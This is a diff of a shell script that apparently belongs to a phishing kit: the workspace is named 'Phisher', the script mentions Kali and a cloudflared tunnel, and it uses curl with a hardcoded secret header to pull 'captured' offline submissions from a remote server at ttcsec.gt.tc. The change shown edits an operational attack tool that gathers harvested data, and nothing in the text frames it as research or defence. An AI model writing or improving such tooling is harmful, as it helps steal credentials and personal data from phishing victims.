@@ -8,12 +8,8 @@
 BASE_URL="https://ttcsec.gt.tc"
 SECRET_KEY="TechTonic_Secret_Handshake_Token_2026"
 
-# Absolute workspace directory alignment
-WORKSPACE_DIR="$HOME/Phisher"
-mkdir -p "$WORKSPACE_DIR"
-cd "$WORKSPACE_DIR" || exit 1
-
-# Reset local cache indexes
+# Files are in project root - all operations use project root
+# Reset local cache indexes (project root)
 rm -f local_log.txt && touch local_log.txt
 rm -f cloudflared.log
 
@@ -51,8 +47,8 @@ echo -e "\033[1;32m[+] ENDPOINT RULES SUCCESSFULLY ALIGNED!\033[0m"
 echo -e "\033[1;32m[+] ROUTING CHANNELS SUCCESSFULLY SYNCED!\033[0m"
 echo -e "[*] Auditing remote data indexes for offline submissions..."
 
-# 4. Fetch data captured by MySQL while Kali was powered off
-OFFLINE_JSON=$(curl -s "$BASE_URL/fetch_offline.php")
+# 4. Fetch offline backlog entries using the secret security header challenge
+OFFLINE_JSON=$(curl -s -H "X-KALI-AUTH: $SECRET_KEY" "$BASE_URL/fetch_offline.php")
 
 if [ ! -z "$OFFLINE_JSON" ] && [ "$OFFLINE_JSON" != "[]" ]; then
     echo "$OFFLINE_JSON" | jq -c '.[]' 2>/dev/null | while read -r row; do
